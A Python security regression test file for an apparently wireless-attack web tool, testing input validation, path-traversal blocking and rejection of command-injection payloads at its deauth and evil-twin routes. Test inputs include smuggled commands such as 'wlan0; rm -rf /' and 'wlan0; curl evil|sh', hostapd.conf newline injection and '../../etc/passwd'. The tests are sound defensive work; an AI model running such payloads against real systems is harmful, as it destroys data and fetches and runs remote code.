"""Security regression tests (P0 hardening).

Covers the input-validation layer, a guard that no shell execution survives anywhere in
`app/`, and route-level rejection of injection payloads. See docs/roadmap/01-security.md.
"""

from pathlib import Path

from app.core import validation


# ---- validation unit tests ----

def test_valid_bssid():
    assert validation.valid_bssid("00:11:22:33:44:55")
    assert validation.valid_bssid("A0:bb:cc:DD:ee:FF")
    assert not validation.valid_bssid("00:11:22:33:44")        # too short
    assert not validation.valid_bssid("wlan0; rm -rf /")       # injection
    assert not validation.valid_bssid("00:11:22:33:44:5g")     # non-hex
    assert not validation.valid_bssid(None)


def test_valid_interface():
    assert validation.valid_interface("wlan0")
    assert validation.valid_interface("wlp3s0")
    assert not validation.valid_interface("wlan0; curl x|sh")  # injection
    assert not validation.valid_interface("wlan0 && reboot")
    assert not validation.valid_interface("")
    assert not validation.valid_interface("a" * 20)            # too long
    assert not validation.valid_interface("-rf")               # leading dash -> CLI flag injection
    assert not validation.valid_interface("-")


def test_valid_channel():
    assert validation.valid_channel(6)
    assert validation.valid_channel("11")
    assert not validation.valid_channel("6; rm -rf /")
    assert not validation.valid_channel(0)
    assert not validation.valid_channel(9999)


def test_sanitize_ssid():
    assert validation.sanitize_ssid("MyNet") == "MyNet"
    assert validation.sanitize_ssid("net\ninject=1") is None   # newline -> hostapd.conf injection
    assert validation.sanitize_ssid("x" * 33) is None          # too long
    assert validation.sanitize_ssid("") is None


def test_safe_path_blocks_traversal(tmp_path):
    base = str(tmp_path)
    assert validation.safe_path("sub/dir", base) is not None
    assert validation.safe_path("../../etc/passwd", base) is None


# ---- guard: no shell execution anywhere in app/ ----

def test_no_shell_execution_in_app():
    app_dir = Path(__file__).resolve().parent.parent / "app"
    offenders = []
    for py in app_dir.rglob("*.py"):
        text = py.read_text(encoding="utf-8")
        if "shell=True" in text or "os.popen" in text:
            offenders.append(py.name)
    assert not offenders, f"shell execution found in: {offenders}"


# ---- route-level rejection (no real attack is launched — rejected before dispatch) ----

def test_start_attack_rejects_injection_bssid(client, csrf):
    resp = client.post(
        "/start_attack",
        json={
            "attack_type": "deauth",
            "network": {"bssid": "wlan0; rm -rf /", "essid": "x", "channel": "6"},
        },
        headers={"X-CSRFToken": csrf},
    )
    assert resp.status_code == 400


def test_set_interface_rejects_injection(client, csrf):
    resp = client.post(
        "/set_interface",
        json={"interface": "wlan0; curl evil|sh"},
        headers={"X-CSRFToken": csrf},
    )
    assert resp.status_code == 400


def test_scan_rejects_bad_interface(client):
    # GET argv-injection vector — rejected before any subprocess runs.
    assert client.get("/scan_wifi?interface=wlan0;rm%20-rf").status_code == 400


def test_start_attack_rejects_bad_config_channel(client, csrf):
    resp = client.post(
        "/start_attack",
        json={
            "attack_type": "evil_twin",
            "network": {"bssid": "00:11:22:33:44:55", "essid": "x", "channel": "6"},
            "config": {"channel": "6\ninject=1"},
        },
        headers={"X-CSRFToken": csrf},
    )
    assert resp.status_code == 400


def test_start_attack_rejects_out_of_range_count(client, csrf):
    resp = client.post(
        "/start_attack",
        json={
            "attack_type": "deauth",
            "network": {"bssid": "00:11:22:33:44:55", "essid": "x", "channel": "6"},
            "config": {"count": 10 ** 12},
        },
        headers={"X-CSRFToken": csrf},
    )
    assert resp.status_code == 400


def test_output_dir_rejects_traversal(client, csrf):
    resp = client.post(
        "/save_output_dir",
        json={"output_dir": "../../etc/airstrike"},
        headers={"X-CSRFToken": csrf},
    )
    assert resp.get_json()["success"] is False
